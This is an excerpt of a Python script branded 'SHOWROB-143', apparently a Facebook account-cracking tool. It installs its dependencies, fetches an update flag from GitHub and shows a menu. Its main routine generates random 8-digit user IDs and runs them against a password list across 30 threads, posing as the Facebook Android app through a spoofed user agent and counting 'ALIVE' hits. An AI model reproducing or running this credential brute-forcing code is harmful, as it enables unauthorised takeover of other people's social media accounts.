...
try:
    ...
    print('\n \033[1;91m[\033[1;93mSHOWROB-143\033[1;91m]\033[1;97m installing requests !...\n')
    time.sleep(0.5)
...
try:
    ...
    print('\n \033[1;91m[\033[1;93mSHOWROB-143\033[1;91m]\033[1;97m installing futures !...\n')
    time.sleep(0.5)
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n \033[1;91m[\033[1;93mSHOWROB-143\033[1;91m]\033[1;97m installing bs4 !...\n')
    time.sleep(0.5)
...
try:
    ...
    if "Bangladesh" not in ___ccc___:
       os.system('xdg-open https://github.com/SEFAT-SHOWROB')
...
try:
    os.system('clear')
    srv=requests.get('https://raw.githubusercontent.com/SEFAT-SHOWROB/SPIDER/main/srv.txt').text 
    if "update" in srv:
        os.system('clear')
        for j in range(3000):
            time.sleep(0.5)
...
def logo():
    ...
    print(f"""
      ...
      db      `7MM"""Mq.  `7MMF'`YMM'   `MM'   db      `7MN.   `7MF'    
     ;MM:       MM   `MM.   MM    VMA   ,V    ;MM:       MMN.    M      
    ,V^MM.      MM   ,M9    MM     VMA ,V    ,V^MM.      M YMb   M      
   ,M  `MM      MMmmdM9     MM      VMMP    ,M  `MM      M  `MN. M      
   AbmmmqMA     MM  YM.     MM       MM     AbmmmqMA     M   `MM.M      
  A'     VML    MM   `Mb.   MM       MM    A'     VML    M     YMM      
.AMA.   .AMMA..JMML. .JMM..JMML.   .JMML..AMA.   .AMMA..JML.    YM      
...
def SHOWROB():
    ...
    _____SHOWROB_____ = input(f'{white}[{green}+{white}] {green}SELECT : {yelloww}')
    if _____SHOWROB_____ in ['A','a','01','1']:
       # os.system('xdg-open https://www.facebook.com/SeFAt.SaRkeR.004')
        ___uids___()
    elif _____SHOWROB_____ in ['B','b','02','2']:
        os.system('xdg-open https://www.facebook.com/M4HADI.143')
    elif _____SHOWROB_____ in ['C','c','03','3']:
        os.system('xdg-open https://m.me/j/Abbh_VtYZ3YtOpBX/')
    elif _____SHOWROB_____ in ['D','d','04','4']:
        exit()
    else:
        print(f'\n[×]{rad} CHOOSE VALID OPTION... ');SHOWROB()
...
def ___uids___():
   ...
   # os.system('xdg-open https://www.facebook.com/NOT.FOUND.THIS.LINK')
    limit = int(input(f"{white}[{green}+{white}] LIMIT       {green}: {white}"))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as SefatSHOWROB:
        os.system('clear')
        logo()
        tl = str(len(user))
        ...
        for love in user:
           ...
           SefatSHOWROB.submit(___random___,ids,passlist)
    print('')
    linex()
...
def ___random___(ids,passlist):
    try:
        global oks,loop
        sys.stdout.write(f'\r\r{rad}[{green} SEARCHING{rad}]{white}<>{rad}[{yelloww}%s{rad}]{white}<>{rad}[{green}ALIVE:%s{rad}]'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
           ...
           # ___MSUA___ = '[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
            ___MSUA___ = 'Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G925F Build/NRD90M) [FBAN/Orca-Android;FBAV/304.2.0.17.118;FBPN/com.facebook.orca;FBLC/ar_AE;FBBV/279457446;FBCR/Vodafone;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2560};FB_FW/1;] FBBK/1'
